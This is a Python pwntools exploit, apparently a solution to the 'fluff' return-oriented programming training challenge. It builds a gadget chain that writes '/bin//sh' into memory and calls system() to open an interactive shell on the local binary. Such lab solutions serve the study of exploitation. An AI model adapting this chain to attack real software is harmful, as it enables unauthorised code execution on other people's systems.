#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def write_mem(address, string):
    # load address to r11
    chain =  p64(0x00400822)     # xor r11,r11; pop r14; mov edi,0x601050; ret
    chain += p64(0xcafebabe)     # junk
    chain += p64(0x00400853)     # pop r12; xor [r10],r12b; ret
    chain += p64(address)
    chain += p64(0x0040082f)     # xor r11,r12; pop r12; mov r13d,0x604060; ret
    chain += p64(0xcafebabe)     # junk

    # r11 <---> r10 (now r10 points to the address)
    chain += p64(0x00400840)     # xchg r11,r10; pop r15; mov r11d,0x602050; ret
    chain += p64(0xcafebabe)     # junk

    # load string to r11
    chain += p64(0x00400822)     # xor r11,r11; pop r14; mov edi,0x601050; ret
    chain += p64(0xcafebabe)     # junk
    chain += p64(0x00400853)     # pop r12; xor [r10],r12b; ret
    chain += string
    chain += p64(0x0040082f)     # xor r11,r12; pop r12; mov r13d,0x604060; ret
    chain += p64(0xcafebabe)     # junk

    # write string in memory
    chain += p64(0x0040084e)     # mov [r10],r11; pop r13; pop r12; xor [r10],r12b; ret
    chain += p64(0xcafebabe)     # junk
    chain += p64(0xcafebabe)     # junk
    chain += p64(0x00400855)     # xor [r10],r12b; ret
    return chain

def exploit():
    p = process('./fluff')
    binary = ELF("fluff", checksec=False)
    address = 0x6010c8  # address to start write to
    systemPLT = binary.symbols["system"]

    # create payload
    payload = 40*"A"
    payload += write_mem(address,  '/bin//sh') # write '/bin/sh' into memory
    payload += p64(0x004008c3)  # pop rdi; ret
    payload += p64(address)
    payload += p64(systemPLT)   # system@PLT

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF